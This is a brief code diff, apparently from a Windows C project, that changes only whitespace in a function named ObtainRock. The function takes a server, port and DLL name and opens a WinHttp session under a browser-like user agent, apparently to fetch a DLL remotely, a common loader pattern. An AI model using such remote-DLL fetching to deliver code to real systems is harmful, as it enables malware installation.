@@ -31,7 +31,7 @@ char* ObtainRock(char* server, DWORD port, char* dll){
 
     wchar_t* w_server = ConvertCharToWideChar(server);
     wchar_t* w_dll = ConvertCharToWideChar(dll);
-    
+
     printf("%s - Establishing the connection to the server\n", info);
 
     hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
